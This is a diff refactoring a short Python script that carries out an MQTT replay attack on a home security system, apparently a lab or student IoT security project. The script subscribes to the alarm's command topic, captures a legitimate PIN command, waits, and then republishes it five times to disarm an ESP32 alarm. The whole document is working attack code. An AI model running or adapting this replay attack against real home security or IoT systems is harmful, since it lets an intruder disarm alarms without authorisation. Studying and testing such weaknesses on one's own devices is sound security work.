@@ -1,53 +1,46 @@
-import paho.mqtt.client as mqtt
 import time
-import os
-from dotenv import load_dotenv
 
-# Load environment variables
-load_dotenv()
+from replay_helpers import create_mqtt_client, connect_and_start, stop_and_disconnect, publish_payloads, load_replay_config
 
-# --- Configuration ---
-BROKER_IP = os.getenv("MQTT_BROKER_LOCAL", "localhost")
-CMD_TOPIC = os.getenv("MQTT_TOPIC_SECURITY_CMD", "shtsp/home/security/cmd")
-PORT = int(os.getenv("MQTT_PORT", "1883"))
+config = load_replay_config()
 
 captured_payload = None
 
 # This function runs when the hacker "sniffs" your message
 def on_message(client, userdata, msg):
     global captured_payload
-    captured_payload = msg.payload.decode()
+    captured_payload = msg.payload.decode(errors="replace")
     print(f"\n🕵️ SNIFFER: Captured legitimate command -> {captured_payload}")
     print("Stopping sniffer... Target payload saved in memory.")
-    client.disconnect() # Stop sniffing now that we have the 'key'
+    client.disconnect()
 
-# --- PHASE 1: SNIFFING ---
-print("📡 Phase 1: Sniffing network for a 'PIN' command...")
-print("ACTION REQUIRED: Go to MQTT Explorer and send the PIN now!")
+def sniff_command():
+    print("📡 Phase 1: Sniffing network for a 'PIN' command...")
+    print("ACTION REQUIRED: Go to MQTT Explorer and send the PIN now!")
 
-sniff_client = mqtt.Client(client_id="Hacker_Sniffer", callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
-sniff_client.on_message = on_message
-sniff_client.connect(BROKER_IP, PORT)
-sniff_client.subscribe(CMD_TOPIC)
-sniff_client.loop_forever()
+    sniff_client = create_mqtt_client("Hacker_Sniffer", on_message)
+    connect_and_start(sniff_client, config["broker_ip"], config["port"])
+    sniff_client.subscribe(config["cmd_topic"])
+    sniff_client.loop_forever()
 
-# --- PHASE 2: PERSISTENCE (WAITING) ---
-print("\n⏱️ Phase 2: Waiting 15 seconds (Simulating the homeowner leaving)...")
-time.sleep(15)
+def replay_payload(payload, repeat=5, interval=0.5):
+    if not payload:
+        print("⚠️ No payload captured. Replay aborted.")
+        return
 
-# --- PHASE 3: THE INJECTION (THE ATTACK) ---
-if captured_payload:
-    print(f"🔥 Phase 3: REPLAYING CAPTURED COMMAND: {captured_payload}")
-    replay_client = mqtt.Client(client_id="Hacker_Replay_Device", callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
-    replay_client.connect(BROKER_IP, PORT)
-    replay_client.loop_start()
+    print("\n⏱️ Phase 2: Waiting 15 seconds (Simulating the homeowner leaving)...")
+    time.sleep(15)
+
+    print(f"🔥 Phase 3: REPLAYING CAPTURED COMMAND: {payload}")
+    replay_client = create_mqtt_client("Hacker_Replay_Device")
+    connect_and_start(replay_client, config["broker_ip"], config["port"])
     
-    # We send it 5 times rapidly to ensure the hack is recorded in the CSV
-    for i in range(5):
-        replay_client.publish(CMD_TOPIC, captured_payload)
-        print(f"[{i+1}] Injected replayed packet...")
-        time.sleep(0.5)
-    
-    replay_client.loop_stop()
-    replay_client.disconnect()
+    publish_payloads(replay_client, config["cmd_topic"], [payload] * repeat, interval)
+
+    stop_and_disconnect(replay_client)
     print("\n✅ Replay Attack Finished. ESP32 should now be DISARMED.")
+
+
+if __name__ == "__main__":
+    sniff_command()
+    replay_payload(captured_payload)
